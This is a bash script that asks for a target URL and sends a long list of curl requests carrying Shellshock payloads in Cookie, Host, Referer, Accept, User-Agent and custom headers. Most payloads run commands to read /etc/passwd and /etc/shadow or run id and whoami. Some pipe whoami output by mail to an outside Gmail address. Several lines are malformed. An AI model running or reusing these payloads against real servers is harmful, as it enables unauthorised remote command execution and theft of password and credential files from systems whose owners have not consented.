#!/bin/bash

echo -e "[!] Default would be target/cgi-bin/status"
echo -e "[!] Custom input is also possible"
echo -ne "[+] Enter Target: "
read Target

curl -v $Target -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" $Target
curl -v $Target/index -H "custom:() { ignored; }; /usr/bin/id"

curl -v -H "Cookie: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
curl -v -X GET "Cookie: () { :;}; echo NS: $(</etc/passwd)" $Target
curl -v -X GET "Cookie: () { :;}; echo "NS:" $(</etc/shadow)" $Target
curl -v -X POST "Cookie: () { :;}; echo NS: $(</etc/passwd)" $Target
curl -v -X POST "Cookie: () { :;}; echo "NS:" $(</etc/shadow)" $Target
curl -v -H "Cookie: env X='() { :; }; echo "vulnerable"' bash -c id" $Target
curl -v -X GET "Cookie: () { :;}; echo $(</etc/passwd)" $Target
curl -v -X GET "Cookie:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"  $Target

curl -v -H "Cookie: () { :; }; /bin/bash -c 'cat /etc/passwd'" $Target
curl -v -H "Cookie: () { :; }; /bin/cat /etc/passwd" $Target
curl -v -H "Cookie: () { :;}; /bin/bash -c 'ping -c 3 8.8.8.8'" $Target
curl -v -H "Cookie: () { 0 <<a <<b <<c <<d <<e <<f <<g <<h <<i <<j <<k <<l <<m; }' bash -c id" $Target
curl -v -H "Cookie: () { :;}; /bin/bash -c \whoami | mail -s '$Target l' mrharoonawan\@gmail.com" $Target
curl -v -H "Cookie: () { foo() { foo; }; >bar; }" $Target
curl -v -H "Cookie: () { x() { _; }; x() { _; } <<a; }' bash -c" $Target
curl -v -H "Cookie: () { x() { _; }; x() { _; } <<`perl -e '{print "A"x1000}'`; } bash -c" $Target
curl -v -H "Cookie: () { _; } >_[$($())] { echo hi mom; id; }' bash -c" $Target
curl -v -H "Cookie: () { :; };' bash -c" $Target
curl -v -H "Cookie: () { 0; }; echo hi mom;' bash -c " $Target
curl -v -H "Cookie: () { _; } >_[$($())] { echo hi mom; id; }' bash -c" $Target
curl -v -H "Cookie: () { _; } >_[$($())] { echo hi mom; id; }' bash -c " $Target
curl -v -H "Cookie: () { function a a>\' bash -c echo" $Target

curl -v $Target/ -H "custom:() { ignored; }; /usr/bin/id"
curl -v -H "Host: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
curl -v -H "Host: env X='() { :; }; echo "vulnerable"' bash -c id" $Target 
curl -v "Host: () { :;}; echo "NS:" $(</etc/passwd)" $Target
curl -v "Host: () { :;}; echo "NS:" $(</etc/shadow)" $Target
curl -v "Host: () { :;}; echo $(</etc/passwd)" $Target
curl -v -X POST "Host: () { :;}; echo "NS:" $(</etc/passwd)" $Target
curl -v -X POST "Host: () { :;}; echo "NS:" $(</etc/shadow)" $Target
curl -v -X POST "Host: () { :;}; echo $(</etc/passwd)" $Target

curl -v -H "Host: () { :; }; /bin/bash -c 'cat /etc/passwd'" $Target
curl -v -H "Host: () { :; }; /bin/cat /etc/passwd" $Target
curl -v -H "Host: () { :;}; /bin/bash -c 'ping -c 3 8.8.8.8'" $Target
curl -v -H "Host: () { 0 <<a <<b <<c <<d <<e <<f <<g <<h <<i <<j <<k <<l <<m; } bash -c id" $Target
curl -v -H "Host: () { :;}; /bin/bash -c \'whoami | mail -s '$Target l' mrharoonawan\@gmail.com'" $Target
curl -v -H "Host: () { foo() { foo; }; >bar; }" $Target
curl -v -H "Host: () { x() { _; }; x() { _; } <<a; } bash -c" $Target
curl -v -H "Host: () { x() { _; }; x() { _; } <<`perl -e '{print "A"x1000}'`; } bash -c" $Target
curl -v -H "Host: () { _; } >_[$($())] { echo hi mom; id; } bash -c" $Target
curl -v -H "Host: () { :; }; bash -c" $Target
curl -v -H "Host: () { 0; }; echo hi mom; bash -c" $Target
curl -v -H "Host: () { _; } >_[$($())] { echo hi mom; id; } bash -c" $Target
curl -v -H "Host: () { _; } >_[$($())] { echo hi mom; id; } bash -c " $Target
curl -v -H "Host: () { function a a>\ bash -c echo" $Target
curl -v "Host:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"  $Target
curl -v -X POST "Host:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"  $Target
curl -v -H "Host:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"  $Target

curl -v $Target -H "custom:() { ignored; }; /usr/bin/id"
curl -v -H "Referer: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
curl -v -H "Referer: env X='() { :; }; echo "vulnerable"' bash -c id" $Target
curl -v "Referer: () { :;}; echo "NS:" $(</etc/passwd)" $Target
curl -v "Referer: () { :;}; echo "NS:" $(</etc/shadow)" $Target
curl -v "Referer: () { :;}; echo $(</etc/passwd)" $Target
curl -v -X POST "Referer: () { :;}; echo "NS:" $(</etc/passwd)" $Target
curl -v -X POST "Referer: () { :;}; echo "NS:" $(</etc/shadow)" $Target
curl -v -X POST "Referer: () { :;}; echo $(</etc/passwd)" $Target


curl -v -H "Referer: () { :; }; /bin/bash -c 'cat /etc/passwd'" $Target
curl -v -H "Referer: () { :; }; /bin/cat /etc/passwd" $Target
curl -v -H "Referer: () { :;}; /bin/bash -c 'ping -c 3 8.8.8.8'" $Target
curl -v -H "Referer: () { 0 <<a <<b <<c <<d <<e <<f <<g <<h <<i <<j <<k <<l <<m; } bash -c id" $Target

curl -v -H "Referer: () { foo() { foo; }; >bar; }" $Target
curl -v -H "Referer: () { x() { _; }; x() { _; } <<a; } bash -c" $Target

curl -v -H "Referer: () { _; } >_[$($())] { echo hi mom; id; } bash -c" $Target
curl -v -H "Referer: () { :; } bash -c" $Target
curl -v -H "Referer: () { 0; }; echo hi mom; bash -c " $Target
curl -v -H "Referer: () { _; } >_[$($())] { echo hi mom; id; } bash -c" $Target
curl -v -H "Referer: () { _; } >_[$($())] { echo hi mom; id; } bash -c " $Target
curl -v -H "Referer: () { function a a>\ bash -c echo" $Target
curl -v -X POST "Referer:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"  $Target
curl -v "Referer:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"  $Target
curl -v -H "Referer:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"  $Target

curl -v $Target -H "custom:() { ignored; }; /usr/bin/id"
curl -v "custom:() { ignored; };; echo "NS:" $(</etc/passwd)" $Target 
curl -v -X POST "custom:() { ignored; };; echo "NS:" $(</etc/passwd)" $Target 

curl -v -H "Accept: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
curl -v -H "Accept: env X='() { :; }; echo "vulnerable"' bash -c id" $Target
curl -v "Accept: () { :;}; echo "NS:" $(</etc/passwd)" $Target
curl -v "Accept: () { :;}; echo "NS:" $(</etc/shadow)" $Target
curl -v "Accept: () { :;}; echo $(</etc/passwd)" $Target
curl -v -X POST "Accept: () { :;}; echo "NS:" $(</etc/passwd)" $Target
curl -v -X POST "Accept: () { :;}; echo "NS:" $(</etc/shadow)" $Target
curl -v -X POST "Accept: () { :;}; echo $(</etc/passwd)" $Target


curl -v -H "Accept: () { :; }; /bin/bash -c 'cat /etc/passwd'" $Target
curl -v -H "Accept: () { :; }; /bin/cat /etc/passwd" $Target
curl -v -H "Accept: () { :;}; /bin/bash -c 'ping -c 3 8.8.8.8'" $Target
curl -v -H "Accept: () { 0 <<a <<b <<c <<d <<e <<f <<g <<h <<i <<j <<k <<l <<m; } bash -c id" $Target

curl -v -H "Accept: () { foo() { foo; }; >bar; }" $Target
curl -v -H "Accept: () { x() { _; }; x() { _; } <<a; } bash -c" $Target

curl -v -H "Accept: () { _; } >_[$($())] { echo hi mom; id; } bash -c" $Target
curl -v -H "Accept: () { :; } bash -c" $Target
curl -v -H "Accept: () { 0; }; echo hi mom; bash -c " $Target
curl -v -H "Accept: () { _; } >_[$($())] { echo hi mom; id; } bash -c" $Target
curl -v -H "Accept: () { _; } >_[$($())] { echo hi mom; id; } bash -c " $Target
curl -v -H "Accept: () { function a a>\ bash -c echo" $Target
curl -v -X GET "Accept:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

curl -v -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
curl -v -H "User-Agent: env X='() { :; }; echo "vulnerable"' bash -c id" $Target
curl -v "User-Agent: () { :;}; echo "NS:" $(</etc/passwd)" $Target
curl -v "User-Agent: () { :;}; echo "NS:" $(</etc/shadow)" $Target
curl -v "User-Agent: () { :;}; echo $(</etc/passwd)" $Target
curl -v -X POST "User-Agent: () { :;}; echo "NS:" $(</etc/passwd)" $Target
curl -v -X POST "User-Agent: () { :;}; echo "NS:" $(</etc/shadow)" $Target
curl -v -X POST "User-Agent: () { :;}; echo $(</etc/passwd)" $Target


curl -v -H "User-Agent: () { :; }; /bin/cat /etc/passwd" $Target
curl -v -H "User-Agent: () { :;}; /bin/bash -c 'ping -c 3 8.8.8.8'" $Target
curl -v -H "User-Agent: () { 0 <<a <<b <<c <<d <<e <<f <<g <<h <<i <<j <<k <<l <<m; } bash -c id" $Target

curl -v -H "User-Agent: () { foo() { foo; }; >bar; }" $Target
curl -v -H "User-Agent: () { x() { _; }; x() { _; } <<a; } bash -c" $Target

curl -v -H "User-Agent: () { _; } >_[$($())] { echo hi mom; id; } bash -c" $Target
curl -v -H "User-Agent: () { :; } bash -c" $Target
curl -v -H "User-Agent: () { 0; }; echo hi mom; bash -c " $Target
curl -v -H "User-Agent: () { _; } >_[$($())] { echo hi mom; id; } bash -c" $Target
curl -v -H "User-Agent: () { _; } >_[$($())] { echo hi mom; id; } bash -c " $Target
curl -v -H "User-Agent: () { function a a>\ bash -c echo" $Target
curl -v -H "User-agent: () { :; }; /bin/bash -c 'cat /etc/passwd'" $Target
curl -v -H "user-agent: () { :; }; /bin/bash -c 'cat /etc/passwd'" $Target
curl -v "User-agent:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"  $Target
curl -v -X POST "User-agent:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"  $Target
curl -v -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" $Target
curl -v "User-agent: () { foo;}; echo Content-Type: text/plain ; echo ; '/etc/passwd' $Target

curl -v "User-agent: () { _; } >_[$($())] { echo hi mom; id; }"
curl -v -H "custom: () { _; } >_[$($())] { echo hi mom; id; }"
curl -v -X POST "User-Agent:  () { _; } >_[$($())] { echo hi mom; id; }"
curl -v -X POST "custom: () { _; } >_[$($())] { echo hi mom; id; }"

